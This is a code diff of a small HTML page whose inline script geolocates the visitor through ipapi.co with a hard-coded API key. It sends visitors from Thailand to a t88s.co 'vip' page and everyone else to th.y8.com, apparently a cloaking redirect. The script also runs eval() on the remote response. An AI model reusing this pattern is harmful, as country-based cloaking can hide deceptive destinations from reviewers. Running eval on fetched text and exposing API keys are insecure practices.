@@ -4,21 +4,24 @@
     <meta charset="utf-8">  
 </head>
 
-<body style="text-align:center">  
-<script type="text/javascript">
-        let xmr = new XMLHttpRequest();
-        xmr.open('get','https://ipapi.co/json/?key=8zpZixnSe4grCqitAL60JbLxAJ1f2rkzSTVY30FyetVOzWkhV8',true);
-        // 
-        xmr.send();
-        xmr.onreadystatechange = function() {
-            if (xmr.readyState == 4 && xmr.status == 200) { 
-                json = eval("("+xmr.responseText+")"); 
-                console.log(json);
-                if (json.country_code == 'TH') {
-                    window.location.href = 'http://t88s.co/vip.html?c=88012711209';
+<body style="text-align:center">   
+    <script type="text/javascript">
+            let xmr = new XMLHttpRequest();
+            xmr.open('get','https://ipapi.co/json/?key=8zpZixnSe4grCqitAL60JbLxAJ1f2rkzSTVY30FyetVOzWkhV8',true);
+            // 
+            xmr.send();
+            xmr.onreadystatechange = function() {
+                if (xmr.readyState == 4 && xmr.status == 200) { 
+                    json = eval("("+xmr.responseText+")"); 
+                    console.log(json);
+                    if (json.country_code == 'TH') {
+                        window.location.href = 'http://t88s.co/vip.html?c=88012711209';
+                    }else{
+                        // document.getElementById("content").innerText = "เกมจะออนไลน์เร็ว ๆ นี้"; 
+                        window.location.href = 'https://th.y8.com';
+                    }
                 }
-            }
-        };
-</script>
+            };
+    </script>
 </body>
-</html> 
+</html>
